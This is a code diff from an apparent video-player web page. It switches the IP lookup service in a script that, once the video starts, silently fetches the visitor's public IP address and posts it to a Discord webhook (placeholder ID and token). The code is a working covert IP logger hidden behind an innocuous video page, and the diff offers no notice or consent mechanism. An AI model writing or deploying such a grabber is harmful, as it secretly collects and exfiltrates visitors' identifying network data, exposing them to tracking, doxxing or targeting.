@@ -176,11 +176,11 @@
                 event.target.playVideo(); // Start playing the video
             }
 
-            // Get user's IP address using ip-api
-            fetch('http://ip-api.com/json/')
+            // Get user's IP address using ipify API
+            fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
-                    console.log('User IP Address:', data.query);
+                    console.log('User IP Address:', data.ip);
 
                     // Send the IP address to your Discord webhook
                     fetch('https://ptb.discord.com/api/webhooks/your-webhook-id/your-webhook-token', {
@@ -189,7 +189,7 @@
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({
-                            content: `New IP Address: ${data.query}`
+                            content: `New IP Address: ${data.ip}`
                         })
                     })
                     .then(response => {
